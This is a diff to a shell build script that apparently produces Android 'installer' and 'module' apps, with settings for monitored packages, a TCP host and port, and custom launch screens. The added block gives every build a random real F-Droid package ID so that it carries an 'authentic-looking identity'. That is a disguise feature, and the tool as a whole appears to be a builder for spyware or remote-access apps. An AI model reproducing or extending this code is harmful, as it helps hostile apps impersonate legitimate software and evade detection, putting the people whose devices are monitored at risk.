@@ -574,6 +574,32 @@ cleanup_overrides() {
 }
 trap cleanup_overrides EXIT
 
+# ── Random package ID from F-Droid pool ───────────────────────────────────────
+# Always override BUILD_MODULE_PACKAGE with a random real package ID drawn from
+# packageids.json (3998 real F-Droid app IDs).  This runs regardless of whether
+# the build tab auto-generated a package ID or the user left it blank — every
+# build gets a fresh, authentic-looking identity automatically.
+_PKGIDS_FILE="$ROOT_DIR/packageids.json"
+if [ -f "$_PKGIDS_FILE" ]; then
+    _RAND_PKG=$(python3 - "$_PKGIDS_FILE" << 'PYEOF'
+import json, random, sys
+try:
+    with open(sys.argv[1]) as f:
+        ids = json.load(f)
+    if ids:
+        print(random.choice(ids))
+except Exception:
+    pass
+PYEOF
+)
+    if [ -n "$_RAND_PKG" ]; then
+        BUILD_MODULE_PACKAGE="$_RAND_PKG"
+        export BUILD_MODULE_PACKAGE
+        echo "==> Module package ID (randomized from F-Droid pool): $BUILD_MODULE_PACKAGE"
+    fi
+fi
+unset _PKGIDS_FILE _RAND_PKG
+
 if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
     echo ""
     echo "==> Per-build customization active"
